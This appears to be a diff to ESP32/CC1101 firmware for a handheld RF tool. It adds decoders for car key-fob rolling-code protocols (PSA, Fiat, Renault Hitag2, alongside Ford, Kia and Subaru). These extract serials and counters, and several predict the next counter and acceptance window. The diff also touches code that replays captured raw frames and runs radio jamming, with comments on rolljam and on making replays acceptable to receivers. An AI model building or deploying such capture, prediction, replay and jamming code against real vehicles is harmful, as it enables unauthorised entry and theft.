   if(!decoded&&te_frdv0){static char mbFV[CAP_SZ/2+1];uint16_t mlFV=ks_manchester(bits,bLen,mbFV);if(mlFV>=80){uint32_t fvsn=0;uint8_t fvb=0;uint32_t fvc=0;if(ks_decodeFordV0(mbFV,mlFV,fvsn,fvb,fvc)){decoded=true;doc["proto"]="Ford-V0";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)fvsn);doc["sn"]=fh;doc["btn"]=fvb;doc["ctr"]=fvc;doc["mfr"]="Ford/Lincoln";HistEntry he={fvsn,0,fvc,31,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(fvsn,31,fvc);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(fvc+(uint32_t)d)&0xFFFFFF;p["window"]=1048576;p["note"]="Ford V0 80-bit Manchester GF(2) CRC";}}}
   // 1m. KIA/HYU V7 — 64-bit Manchester FM, CRC8 poly=0x7F init=0x4C, 433 MHz
@@ -7148,6 +8442,77 @@ String decodeSignal(){
   if(!decoded&&te_kv2){static char mbKV2[CAP_SZ/2+1];uint16_t mlKV2=ks_manchester(bits,bLen,mbKV2);if(mlKV2>=53){uint32_t kv2sn=0;uint16_t kv2ct=0;uint8_t kv2b=0;bool kv2v=false;if(ks_decodeKiaV2(mbKV2,mlKV2,kv2sn,kv2ct,kv2b,kv2v)){decoded=true;doc["proto"]="KIA-V2";char fh[12];snprintf(fh,12,"0x%08lX",(unsigned long)kv2sn);doc["sn"]=fh;doc["ctr"]=kv2ct;doc["btn"]=kv2b;doc["ck_ok"]=kv2v;doc["mfr"]="Kia/Hyundai (EU)";HistEntry he={kv2sn,0,(uint32_t)kv2ct,32,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(kv2sn,32,(uint32_t)kv2ct);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((kv2ct+(uint16_t)d)&0xFFF);p["window"]=4096;p["note"]="KIA/HYU V2 53-bit Manchester (CRC4)";}}}
   // 1o. Subaru V2 — 80-bit Manchester OOK, TE_H≈1013µs, 433 MHz NA
   if(!decoded&&te_sub2){uint32_t sv2sn=0;uint8_t sv2b=0;uint16_t sv2ct=0;bool sv2v=false;if(ks_decodeSubaruV2(buf,cnt,sv2sn,sv2b,sv2ct,sv2v)){decoded=true;char fh[10];snprintf(fh,10,"0x%06lX",(unsigned long)sv2sn);doc["proto"]="Subaru-V2";doc["sn"]=fh;doc["ctr"]=sv2ct;doc["btn"]=sv2b;doc["ck_ok"]=sv2v;doc["mfr"]="Subaru";HistEntry he={sv2sn,0,(uint32_t)sv2ct,34,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(sv2sn,34,(uint32_t)sv2ct);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(uint32_t)((sv2ct+(uint16_t)d)&0xFFFF);p["window"]=4096;p["note"]="Subaru V2 Manchester OOK (TE_H≈1013µs, 987 baud, 20-bit sequential counter, delta=1)";}}
+  // 2b. PSA (Peugeot/Citroën/DS 2001-2017) — FM0/biphase, TE≈225µs, 80-200-bit
+  // frames, crypto not public. Serial = leading stable bits (cross-frame LCP on
+  // repeats); the intra-capture consensus vote confirms a real press the same
+  // way as the other multi-repeat protocols. Runs after every PWM/Manchester
+  // vehicle decoder; only gate/garage protocols follow it.
+  if(!decoded&&te_psa){
+    uint32_t psn=0; uint16_t prol=0; uint8_t pbtn=0; int plen=0; static uint8_t ppay[26];
+    if(ks_decodePSA(rfBuf,rfLen,(int)cA,psn,prol,pbtn,plen,ppay)){
+      decoded=true;
+      doc["proto"]="PSA-RKE";
+      char fh[12]; snprintf(fh,12,"0x%08lX",(unsigned long)psn); doc["sn"]=fh;
+      char rh[12]; snprintf(rh,12,"0x%04X",prol);        doc["roll"]=rh;
+      doc["btn"]=pbtn; doc["pay_len"]=plen;
+      char pb[64]; int off=0;
+      for(int i=0;i<plen&&i<8&&off<60;i++) off+=snprintf(pb+off,64-off,"%02X",ppay[i]);
+      doc["pay_head"]=pb;
+      doc["mfr"]="Peugeot/Citroën/DS";
+      { int cAgree=0,cTot=0;
+        ks_consensusVote(rfBuf,rfLen,ks_consPSA,psn,pbtn,&cAgree,&cTot);
+        char cs[8]; snprintf(cs,8,"%d/%d",cAgree,cTot); doc["consensus"]=cs;
+        if(cTot>=2&&cAgree<2&&cAgree<cTot){ doc["confirmed"]=false; doc["candidate"]=true; } }
+      HistEntry he={psn,0,prol,35,mhz,nowMs}; ks_hPush(he);
+      JsonObject p=doc["predict"].to<JsonObject>();
+      p["window"]=0; p["note"]="PSA FM0 rolling — crypto not public; serial from stable prefix";
+    }
+  }
+
+  // FIAT V1 — 104-bit Manchester rolling code, byte-XOR checksum validated.
+  if(!decoded&&te_fiatv1){
+    uint32_t fsn=0, fhop=0; uint8_t fbtn=0, fvar=0; uint16_t fctr=0;
+    if(ks_decodeFiatV1(rfBuf,rfLen,fsn,fbtn,fctr,fhop,fvar)){
+      decoded=true;
+      doc["proto"]="FIAT-V1";
+      char fh[12]; snprintf(fh,12,"0x%08lX",(unsigned long)fsn); doc["sn"]=fh;
+      doc["btn"]=fbtn; doc["ctr"]=fctr; doc["te_variant"]=(int)(fvar?"B(100/200us)":"A(250/500us)");
+      char hh[12]; snprintf(hh,12,"0x%08lX",(unsigned long)fhop); doc["hop"]=hh;
+      doc["btn_name"]=(fbtn==0x8)?"Unlock":(fbtn==0x4)?"Lock":(fbtn==0x2)?"Trunk":"Close";
+      doc["mfr"]="Fiat/Lancia/Alfa";
+      { int cAgree=0,cTot=0;
+        ks_consensusVote(rfBuf,rfLen,ks_consFiatV1,fsn,fbtn,&cAgree,&cTot);
+        char cs[8]; snprintf(cs,8,"%d/%d",cAgree,cTot); doc["consensus"]=cs;
+        if(cTot>=2&&cAgree<2&&cAgree<cTot){ doc["confirmed"]=false; doc["candidate"]=true; } }
+      HistEntry he={fsn,fhop,(uint32_t)fctr,36,mhz,nowMs}; ks_hPush(he);
+      int32_t d=ks_estDelta(fsn,36,(uint32_t)fctr);
+      JsonObject p=doc["predict"].to<JsonObject>();
+      p["delta"]=d; p["next_ctr"]=(uint16_t)((fctr+(uint16_t)d)&0x3FF);
+      p["window"]=1024; p["note"]="FIAT V1 104-bit Manchester, 12-byte XOR frame checksum (validated)";
+    }
+  }
+
+  // Renault V1 (Hitag2) — 104-bit Manchester frame behind a 1500/1000µs sync,
+  // TE=125µs. Layer-1 only: wire fields recovered, key/epoch NOT.
+  if(!decoded&&te_renv1){
+    uint32_t rsn=0,rhop=0,rk2=0; uint8_t rbtn=0,rtail=0; uint16_t rctr=0;
+    if(ks_decodeRenaultHitag2(rfBuf,rfLen,rsn,rbtn,rctr,rhop,rtail,rk2)){
+      decoded=true;
+      doc["proto"]="Renault-V1/Hitag2";
+      char rh[12]; snprintf(rh,12,"0x%08lX",(unsigned long)rsn); doc["sn"]=rh;
+      doc["btn"]=rbtn; doc["ctr"]=rctr;
+      char hh[12]; snprintf(hh,12,"0x%08lX",(unsigned long)rhop); doc["hop"]=hh;
+      char k2[10]; snprintf(k2,10,"0x%06lX",(unsigned long)rk2); doc["key2"]=k2;
+      doc["tail"]=rtail;
+      doc["btn_name"]=(rbtn==0x2)?"Unlock":(rbtn==0x1)?"Lock":(rbtn==0x4)?"Trunk":(rbtn==0x8)?"Panic":"?";
+      doc["mfr"]="Renault (Hitag2)";
+      doc["confidence"]="structural";
+      HistEntry he={rsn,rhop,(uint32_t)rctr,37,mhz,nowMs}; ks_hPush(he);
+      JsonObject p=doc["predict"].to<JsonObject>();
+      p["window"]=0;
+      p["note"]="Hitag2 wire fields recovered; epoch/key-recovery pending ";
+    }
+  }
 
   // ─── GATE / GARAGE-DOOR OPENERS (checked only after all vehicle protocols) ────
   // 2. CAME-12
@@ -7301,6 +8666,57 @@ String decodeSignal(){
   // match; an undecoded capture is raw.
   if(!doc.containsKey("confidence")) doc["confidence"]=decoded?"heuristic":"raw";
   if(!doc.containsKey("confirmed"))  doc["confirmed"]=false;
+
+  // ─── N13: timing-fingerprint classifier ────────────────
+  // Every capture — decoded or not — is quantized onto a 4-axis grid:
+  //   freq : 200 kHz bins (433.92 -> 2169; 315.00 -> 1575000 — the two bands
+  //         never collide because sub-400 is scaled kHz-side and >=400 is
+  //         scaled 0.2 MHz-side; a 433 MHz fob cannot reach 7 digits until
+  //         1400 MHz, and a sub-400 fob cannot be under 1000000)
+  //   TE   : log2 bins (100-125, 125-156, 156-195, ... µs)
+  //   ratio: half-step bins (1.0-1.25, 1.25-1.5, ...)
+  //   bits : log2 bins (64-128, 128-256, 256-512 pulses)
+  // The per-key histogram lives in NVS. A capture that lands in a bucket
+  // never seen before is a NEW transmitter (or a new button mode); a capture
+  // that lands in the same bucket with a different serial is a second fob
+  // sharing the timing profile — e.g. a clone or a rolljam re-send. This runs
+  // on every capture, adds no per-decode allocation, and costs one NVS write
+  // only when the bucket population changes.
+  {
+    // Quantization: freq to 0.2 MHz, TE to log2 steps from 64µs, ratio to 0.25,
+    // bit count to log2 steps of 32.
+    uint32_t fb  = (mhz>=400.f)?((uint32_t)(mhz/0.2f)):((uint32_t)(mhz*5000.f));
+    uint32_t tb  = (cA>0)?((uint32_t)(log2f((float)cA/64.f)*4.f)):0;
+    uint32_t rb  = (uint32_t)(ratio/0.25f);
+    uint32_t bb  = (bLen>0)?((uint32_t)(log2f((float)bLen/32.f)*4.f)):0;
+    // Hash the four axes into one NVS key char.
+    char fk[17];
+    snprintf(fk,sizeof(fk),"n13_%lx%lx%lx%lx",
+             (unsigned long)(fb&0xFFFF),(unsigned long)(tb&0x1F),
+             (unsigned long)(rb&0x1F),(unsigned long)(bb&0x1F));
+    uint32_t pop=0;
+    if(!n13Ready){ n13Prefs.begin("n13fp",false); n13Ready=true; }
+    if(n13Prefs.isKey(fk)) pop=n13Prefs.getULong(fk,0);
+    // Burst guard: an intra-burst repeat counts once per press. The capture
+    // path coalesces a single press to one capture, but WiFi + serial paths
+    // can both deliver the same burst; the 2s gate below absorbs that.
+    static char n13LastKey[17]="";
+    static uint32_t n13LastMs=0;
+    if(strcmp(fk,n13LastKey)!=0 || (millis()-n13LastMs)>2000){
+      strlcpy(n13LastKey,fk,sizeof(n13LastKey));
+      n13LastMs=millis();
+      n13Prefs.putULong(fk,pop+1);
+      pop=pop+1;
+      n13TotalPop++;
+      n13KeyMirror(fk,pop);
+    }
+    doc["fp_key"]=fk;
+    doc["fp_pop"]=pop;
+    // First-seen flag: a bucket with population 1 means this exact timing
+    // profile has never been seen before on this card.
+    if(pop==1) doc["fp_first_seen"]=true;
+  }
+
 
   // ─── Extra signal metadata for dashboard re-processing ────────────────────
   doc["te_b"]=cB; doc["blen"]=bLen; doc["cap_mode"]=fskCapMode?"2fsk":"ook";
@@ -7487,25 +8903,31 @@ String decodeSignal(){
   //    A real second fob press would have a different rolling code → different
   //    pulse widths in the data section → different hash.
   {
-    static String   _ddProto = "";
+    // Allocation hygiene: the old code copied proto into a
+    // String here on EVERY decode — the same allocation class that made the
+    // import non-deterministic under the 2–3 KB idle heap. The proto names are
+    // all under 24 bytes (longest: "Hyundai-SantaFe"/"Toyota-Denso"), so a
+    // fixed static buffer and strcmp covers the comparisons without any heap.
+    static char    _ddProto[24] = "";
     static uint16_t _ddEdges = 0;
     static uint16_t _ddTe    = 0;
     static uint32_t _ddMs    = 0;
     static uint32_t _ddHash  = 0;
-    String  _cp = doc["proto"]|"";
+    const char* _cp = doc["proto"] | "";
+    bool _hasProto = (_cp[0] != '\0');
     uint16_t _ce = (uint16_t)cnt;
     uint16_t _ct = (uint16_t)cA;
     // FNV-1a mix of first 16 pulse widths + frequency bucket
     uint32_t _ph = (uint32_t)(rfFreq * 100.f);
     for(int _i=0; _i<cnt&&_i<16; _i++) _ph = (_ph ^ (uint32_t)buf[_i]) * 16777619UL;
-    bool _timeDup  = (_cp.length()>0 && _cp==_ddProto && _ce==_ddEdges && _ct==_ddTe && (nowMs-_ddMs)<200UL);
-    bool _hashDup  = (_cp.length()>0 && _cp==_ddProto && _ph==_ddHash);
+    bool _timeDup  = (_hasProto && strcmp(_cp,_ddProto)==0 && _ce==_ddEdges && _ct==_ddTe && (nowMs-_ddMs)<200UL);
+    bool _hashDup  = (_hasProto && strcmp(_cp,_ddProto)==0 && _ph==_ddHash);
     if(_timeDup || _hashDup){
-      lastDecode="{\"error\":\"dup-burst\",\"proto\":\""+_cp+"\"}";
+      lastDecode="{\"error\":\"dup-burst\",\"proto\":\""+String(_cp)+"\"}";
       stackHwmAfterDecode=(uint32_t)uxTaskGetStackHighWaterMark(NULL); stackSample();
   return lastDecode;
     }
-    _ddProto=_cp; _ddEdges=_ce; _ddTe=_ct; _ddMs=nowMs; _ddHash=_ph;
+    strlcpy(_ddProto,_cp,sizeof(_ddProto)); _ddEdges=_ce; _ddTe=_ct; _ddMs=nowMs; _ddHash=_ph;
   }
 
   doc["dur_ms"] = lastCapDurMs;
@@ -7545,15 +8967,52 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
   // the shared front end; measurements are in loraParkReset(). Without this the floor reads
   // about 11 dB high and the trigger at floor+10 crosses on the module's own noise.
   loraParkReset();
-  // SIDLE, flush the TX FIFO (0x3A), then SRX.
+  // SIDLE, apply the modem configuration, flush the TX FIFO (0x3A), then SRX.
+  //
+  // The modem writes are unconditional, and that is the point. MDMCFG2/DEVIATN are the
+  // only registers measured to clear a latched front-end state this board can enter: a
+  // ~35 dB elevation across 310-370 MHz that holds until the modem block is rewritten.
+  // It is reached by cycling the 3.3 V sensor rail, which PIN_SENSOR_CE shares with the
+  // CC1101 (the rail-cycle diagnostics do this). See
+  //
+  // Writing them only when 2FSK was selected left the latch in place on the OOK path,
+  // which is the common one. Measured: a capture attempt at 315 MHz did NOT clear the
+  // elevation, while cap_mode (which rewrites 0x12/0x15) did. Hence this block is no
+  // longer inside the fskCapMode branch, and the write happens before the FIFO flush.
   SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
-  cc_strobe(0x36); delay(1); cc_strobe(0x3A); delay(1); cc_strobe(0x34); delay(10);
-  if(fskCapMode){ cc_writeReg(0x12,0x00); cc_writeReg(0x15,0x47); }  // 2FSK if requested
+  cc_strobe(0x36); delay(1);
+  cc_writeReg(0x12, fskCapMode?0x00:0x30);   // MDMCFG2: 2-FSK or OOK, no sync
+  cc_writeReg(0x15, fskCapMode?0x47:0x00);   // DEVIATN: ±47.6 kHz in FSK, n/a in OOK
+  // AGCCTRL0 FILTER_LENGTH (N17): the stock 16-sample average (~150 µs of memory)
+  // smears sub-150 µs OOK lows against their highs, measured the
+  // consequence: ~1/8 of a frame's pulses resolved. A shorter filter tracks the
+  // envelope faster at the cost of a noisier floor. The knob is persistent and
+  // applied here at capture setup, the same block that clears the latched
+  // front-end state — one place, every capture.
+  {
+    uint8_t agc0 = 0x91;                      // 0x91: FILTER_LENGTH=01 (16), default
+    switch(agcFilterLen){
+      case 8:  agc0 = 0x51; break;             // FILTER_LENGTH=00 (8)
+      case 16: agc0 = 0x91; break;              // FILTER_LENGTH=01 (16)
+      case 32: agc0 = 0xD1; break;              // FILTER_LENGTH=10 (32)
+      case 64: agc0 = 0x11; break;              // FILTER_LENGTH=11 (64)
+      default: agcFilterLen = 16; break;        // unknown value: fall back to stock
+    }
+    cc_writeReg(0x1D, agc0);                   // AGCCTRL0
+    lastCapAgc = (agcFilterLen != 16);
+  }
+  cc_strobe(0x3A); delay(1); cc_strobe(0x34); delay(10);
   addLog("[CAP] Capturing on "+String(curFreq,2)+" MHz…");
   setLed(255,255,0); rfLen=0; rfFreq=curFreq;
 
   // Average 64 RSSI samples (~32 ms) for the noise floor. Averaging avoids letting a
   // nearby fob dominate the threshold; cap suspicious readings above -60 dBm at -75.
+  //
+  // NOTE: discarding the settle ramp before this average was tried and did NOT change the
+  // reading. The low samples are not confined to the first ~100 us --
+  // at 315 the level fluctuates between roughly -100 and -65 over tens of milliseconds, so
+  // the mean lands between the two and does not describe either. See the note below on why
+  // that matters for the edge detector.
   long _nsum=0;
   for(int i=0;i<64;i++){ _nsum+=cc_fastRSSI(); delayMicroseconds(500); }
   int noiseMax=(int)(_nsum/64);
@@ -7612,6 +9071,68 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
     SPI.endTransaction();
   }
   if(!hit){rfRssi=noiseMax;addLog("  ⚠ No signal");setLed(0,150,65);lastCapDurMs=(uint32_t)(millis()-_cT0);return false;}
+
+  // ── Frame-gap arming (N16) ─────────────────────────────────────────────────
+  // The trigger above fired on FIRST ENERGY. In gap mode the buffer is not armed
+  // yet: keep sampling until the carrier goes quiet for gapArmQuietUs — the
+  // signature that a plateau (Flipper RAW head) just ended and a frame boundary
+  // is at hand — or the restart budget expires, whichever comes first.
+  //
+  // Measured on the bench: during a Flipper RAW playback the AGC
+  // plateau rides AT the edge threshold (-69..-73 against edgeThr -72), so a
+  // mid-plateau quiet run never happens — the quiet signature can only be the
+  // silence BEFORE the burst or the inter-repeat gap. Two cases therefore exist:
+  //
+  //   armed   — a quiet run completed and the buffer starts on the NEXT energy
+  //             onset, which is a frame edge. This is the win: the successful
+  //             captures recorded 512 raw transitions in ~30 ms because they were
+  //             armed and waiting when the burst arrived.
+  //   expired — the budget ran out while energy was still present (trigger fired
+  //             mid-plateau). Recording from there catches plateau ringing only
+  //             (after75=3..10, BUFFER_FULL). So on expiry the wait is retried
+  //             up to gapArmRetries times: go quiet again, then re-arm. If the
+  //             retries are exhausted the capture falls back to the legacy path —
+  //             a fob press whose energy started the instant the trigger fired
+  //             (the common case) must never be lost to the arming.
+  bool gapArm = gapArmDefault;
+  if(gapArmPerCapture>=0){ gapArm=(gapArmPerCapture>0); gapArmPerCapture=-1; }
+  if(gapArm){
+    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+    bool armed=false; int retriesLeft=gapArmRetries;
+    addLog("  Gap-arming: waiting for frame-gap signature…");
+    // Each pass gets a fresh budget. A pass ends armed (quiet run found) or
+    // expired. On expiry with the carrier still live (a plateau — the trigger
+    // fired mid-burst), burn a retry and go again: the burst ends eventually,
+    // and the next energy onset after real quiet is a frame edge. On expiry
+    // with the carrier quiet, or with retries exhausted, fall through to the
+    // legacy record path so a capture is never lost to the arming itself.
+    while(!armed){
+      unsigned long armStart=micros(); unsigned long quietStart=armStart;
+      // Quiet is measured BELOW the plateau, not at edgeThr: the AGC rides the
+      // edge threshold during a RAW playback, so edgeThr-crossings are the plateau
+      // itself. A run below edgeThr−gapArmQuietBelowDb can only be a true gap.
+      const int quietThr = edgeThr - gapArmQuietBelowDb;
+      while(micros()-armStart<(unsigned long)gapArmBudgetMs*1000UL){
+        int r=cc_fastRSSI();
+        if(r<=quietThr){ if(micros()-quietStart>=gapArmQuietUs){armed=true;break;} }
+        else quietStart=micros();
+        yield();
+      }
+      if(armed) break;
+      int rNow=cc_fastRSSI();
+      if(rNow>trigThr&&retriesLeft>0){
+        retriesLeft--;
+        addLog(String("  Gap-arm: plateau at expiry — retrying (")+String(retriesLeft)+" left)");
+        continue;
+      }
+      break;
+    }
+    SPI.endTransaction();
+    addLog(armed?String("  Gap-armed after quiet run"):
+                 String("  Gap-arm budget expired — arming at first energy"));
+    lastCapGapArm=armed;
+  } else lastCapGapArm=false;
+
 
   // ── Edge capture — digital GDO0 or RSSI ───────────────────────────────────
   // This board does not route the CC1101's GDO0 to GPIO 48, so the digital path is
@@ -7705,7 +9226,40 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
   // with transitions but leaves empty names the gate that dropped it.
   int diagRaw=rawLen, diagAfter75=0, diagAfterToy=0;
   bool captureDiag = lastCapDiag;
-  if(rawLen<16){addLog("  ⚠ Too few edges ("+String(rawLen)+") — likely noise");setLed(0,150,65);return false;}
+  // The ENDING matters as much as the count. rawLen hitting CAP_SZ means the buffer
+  // saturated -- the loop kept finding transitions until it ran out of room, which is what
+  // noise looks like. Short of CAP_SZ means the recording window expired first, so the
+  // source stopped producing transitions. Opposite outcomes, and the bare count does not
+  // distinguish them, which is why `raw` looked erratic §4.2.
+  if(captureDiag){
+    uint32_t recMs=(uint32_t)((micros()-capStart)/1000UL);
+    addLog("  [DIAG] raw="+String(rawLen)+"/"+String(CAP_SZ)+
+           " rec_ms="+String(recMs)+
+           " ended="+String(rawLen>=CAP_SZ?"BUFFER_FULL":"window")+
+           " peak="+String((int)peak)+" edgeThr="+String(edgeThr));
+  }
+  // A low edge count has two very different causes, and the old single message named
+  // neither. If the capture is running in FSK mode and the trigger DID fire (the carrier
+  // was present, peak over floor+10), the near-empty buffer is not noise: AGCCTRL2's
+  // RSSI is an AMPLITUDE estimate, and a constant-envelope 2-FSK carrier carries its
+  // information in frequency, so it registers as one long uninterrupted run and yields
+  // no edges at all. Measured on the bench 2026-10-05 with a real 2-FSK transmitter: a
+  // 2FSK burst held the envelope flat at -47 dBm (first 64 samples identical), 9 runs in
+  // 2 s; the same file path in OOK gave 2436 runs. The FSK decode path needs GDO0
+  // frequency discrimination, which this board revision does not route, so this is both
+  // expected and unfixable in firmware. Say so rather than blaming noise.
+  if(rawLen<16){
+    bool fskConstEnv = fskCapMode && hit && peak>trigThr;
+    if(fskConstEnv){
+      addLog("  ⚠ FSK capture: RSSI sees a constant envelope ("+String(rawLen)+" edges) — OOK edge-detector needs GDO0 on a 2-FSK carrier");
+      serialEmit(String("{\"event\":\"capture_rejected\",\"reason\":\"fsk-const-envelope\",\"edges\":")+
+                 String(rawLen)+",\"peak\":"+String(peak)+
+                 ",\"detail\":\"FSK data is in frequency, not amplitude; the RSSI edge detector cannot resolve a constant-envelope carrier. Needs a routed GDO0 in FSK mode.\"}");
+    } else {
+      addLog("  ⚠ Too few edges ("+String(rawLen)+") — likely noise");
+    }
+    setLed(0,150,65);return false;
+  }
 
   // Filter sub-75 µs glitches and merge adjacent pulses.
   // 75 µs is safely below the shortest real TE (Santa Fe: ~90 µs) while
@@ -7760,6 +9314,24 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
   if(captureDiag){
     addLog("  [DIAG] raw="+String(diagRaw)+" after75="+String(diagAfter75)+
            " afterToy="+String(diagAfterToy)+" toyBand="+String(_toyBand?"1":"0"));
+    // The width distribution is what says whether a frame is present. A real OOK frame is
+    // short/long at roughly 2:1; noise is clustered near the filter cutoffs. Report the
+    // raw widths in bands rather than the whole buffer: enough to see the shape, bounded
+    // in size so it cannot flood the serial line.
+    int b_lt50=0,b_50_75=0,b_75_150=0,b_150_300=0,b_300_600=0,b_600_1k=0,b_gt1k=0;
+    for(int i=0;i<diagRaw;i++){
+      uint16_t w=rawBuf[i];
+      if(w<50) b_lt50++;
+      else if(w<75) b_50_75++;
+      else if(w<150) b_75_150++;
+      else if(w<300) b_150_300++;
+      else if(w<600) b_300_600++;
+      else if(w<1000) b_600_1k++;
+      else b_gt1k++;
+    }
+    addLog("  [DIAG] widths us: <50="+String(b_lt50)+" 50-75="+String(b_50_75)+
+           " 75-150="+String(b_75_150)+" 150-300="+String(b_150_300)+
+           " 300-600="+String(b_300_600)+" 600-1k="+String(b_600_1k)+" >1k="+String(b_gt1k));
   }
   // Level of rfBuf[0] after filtering. Defaults to HIGH only when nothing
   // survived, which callers treat as "no capture".
@@ -7790,11 +9362,11 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
     }
   }
   // ── Uniform-pulse refusal ("no-bit-edges") ─────────────────────────────────
-  // The RX-side twin of the replayRaw false success (research/19 §1, §2). On this board GDO0
+  // The RX-side twin of the replayRaw false success. On this board GDO0
   // is absent, so capture falls back to polling RSSI; the poll rate (~1600 µs, limited by
   // the SPI transaction time) is slower than a Kia V3/V4 short pulse, so the encoder sees a
   // uniform train and the decoders are fed non-data. A real capture came back as uniform
-  // ~1600 µs pulses and was still reported as "✓ 512 edges" with has_ctr:true (research/13).
+  // ~1600 µs pulses and was still reported as "✓ 512 edges" with has_ctr:true.
   //
   // A genuine OOK frame is short/long at roughly a 2:1 ratio. So: if essentially every
   // pulse sits within a few percent of the same width, there are no bit edges to decode and
@@ -7852,7 +9424,7 @@ void startJam(float mhz){
   scanActive=false;
   // Path choice. A toggling GPIO 48 is NOT evidence that the CC1101's GDO0 is readable:
   // on this board revision GPIO 48 is the SX1278's DIO0 and the CC1101's GDO0 is not routed
-  // at all (research/15, and the vendor firmware's own note that GDO0 is not wired to the
+  // at all (and the vendor firmware's own note that GDO0 is not wired to the
   // ESP32 on this PCB). A toggle can therefore come from the LoRa side, and choosing the
   // async path on that basis would transmit nothing -- the pin would be driven, but it is
   // not the CC1101's TX data input.
@@ -7895,6 +9467,7 @@ void startJam(float mhz){
   }
   jamActive=true; jamFreq=mhz;
   jamLastFeed=millis(); jamUnderruns=0; jamMaxGapMs=0;
+  n12MarkTx(true,mhz);                                  // N12: replay/jam TX is on the air
   setLed(180,0,0);                                      // red = jamming
 }
 
@@ -7954,6 +9527,7 @@ void stopJam(){
     SPI.endTransaction();
   }
   jamActive=false; jamFreq=0.0f;
+  n12MarkTx(false,0.0f);                                // N12: TX off the air
   setLed(0,150,65);                                   // back to idle green
 }
 
@@ -7968,7 +9542,7 @@ void stopJam(){
 //
 // The default preserves the old call sites that genuinely do start HIGH (the
 // protocol builders below generate buf[0] as a HIGH duration by construction).
-// ─── Packet-mode raw replay (research/19 §5 step 4) ───────────────────────────
+// ─── Packet-mode raw replay ───────────────────────────
 //
 // replayRaw() takes an arbitrary list of pulse widths and, on a board with GDO0, bit-bangs
 // them. Where GDO0 is absent (this revision) packet mode is the only TX path, and the chip
@@ -8077,7 +9651,7 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
   if(reps>5) reps=5;
 
   // ── Symbol period from the protocol's te, not from min(data) ────────────────
-  // Deriving S from the shortest pulse is what research/20 §2 caught: a real Kia V3 frame
+  // Deriving S from the shortest pulse is what §2 caught: a real Kia V3 frame
   // contains a single 132 us outlier, so min() gave S0=132 and the fit then had to coarsen
   // to 264 us — which quantises the protocol's two symbol widths to
   //    400 us -> 528 us (+32%)   and   800 us -> 792 us (-1%)
@@ -8108,7 +9682,7 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
   }
   if(S0<40) return false;                      // below this, real OOK shaping is not achievable
 
-  // ── Trim the true boundary artefacts (research/21 §2.1, corrected) ───────────
+  // ── Trim the true boundary artefacts ───────────
   //
   // klTrimToFrame cuts a window around the separator: 20 pulses before it, then one
   // pitch. That window's ends are artefacts of where the cut landed, not protocol
@@ -8118,7 +9692,7 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
   //                       a 3.0x stretch on the FIRST pulse the receiver sees
   //   index 182 1188 us  the NEXT frame's separator
   //
-  // research/21 §2.1 recommended trimming to the separator boundaries, i.e. dropping
+  // §2.1 recommended trimming to the separator boundaries, i.e. dropping
   // index 20 (1188 us) as well. MEASURED, that breaks the frame:
   //
   //   [0:183) 183 pulses -> decodes (ctr=38)
@@ -8127,7 +9701,7 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
   //   [20:182) 162 pulses -> NO DECODE          <- also drop the separator
   //   [21:182) 161 pulses -> NO DECODE
   //
-  // Index 20 is the frame's own SYNC, not an artefact: research/06 records Kia V3/V4 as
+  // Index 20 is the frame's own SYNC, not an artefact: records Kia V3/V4 as
   // "preceded by 12 preamble pairs and a 1000-1500 us sync pulse", and the decoder scans
   // for that preamble to lock on. So the correct trim drops the partial leading pulse and
   // the trailing next-frame separator, and keeps the separator in the payload.
@@ -8194,7 +9768,7 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
     return false;
   }
 
-  // ── Ratio guard (research/20 §2.2) ─────────────────────────────────────────
+  // ── Ratio guard ─────────────────────────────────────────
   // The recovered short and long widths must still look like the protocol's. Without this,
   // a grid that fits but distorts the ratio would transmit a frame no PWM receiver accepts,
   // and a bench failure would be unattributable. Refusing is the honest outcome.
@@ -8226,12 +9800,12 @@ bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int rep
              ",\"te_short_us\":"+String(teShort)+",\"te_long_us\":"+String(teLong)+
              ",\"mult\":"+String(usedMult)+",\"bytes\":"+String(n)+
              ",\"worst_err_bound_us\":"+String((teShort>0)?(S/2):(S0/2))+","+
-             // research/21 §2.1 asked for this to be visible: how many boundary pulses were
+             // §2.1 asked for this to be visible: how many boundary pulses were
              // dropped, and how many pulses the payload actually contains.
              "\"boundary_pulses\":"+String(boundaryPulses)+
              ",\"payload_pulses\":"+String(flen)+",\"input_pulses\":"+String(len)+","+
              "\"ratio_ok\":"+String((teLong>teShort)?"true":"false")+"}");
-  // research/20 §3: apply `reps` here as the GDO0 path does. The original comment claimed
+  // §3: apply `reps` here as the GDO0 path does. The original comment claimed
   // repetition was "handled inside the packet", which is false — one packet is one frame —
   // so callers asking for 3 got 1 on this path. Rolling-code receivers commonly expect the
   // repetition a real fob sends, so send the packet `reps` times.
@@ -8259,10 +9833,10 @@ bool replayRaw(float mhz,uint16_t* data,int len,int reps=3,bool startHigh=true){
     serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"low_battery\",\"v\":" + String(battV,2) + "}");
     return false;
   }
-  // ── TX path selection (research/19 §1, §5 step 4) ───────────────────────────
+  // ── TX path selection ───────────────────────────
   // The bit-bang below requires PIN_GDO0 to actually be the CC1101's async TX data input.
   // On this revision GPIO 48 is the SX1278's DIO0 and the CC1101's GDO0 is not routed
-  // (research/14), so bit-banging toggles the LoRa module's pin and this function used to
+  // so bit-banging toggles the LoRa module's pin and this function used to
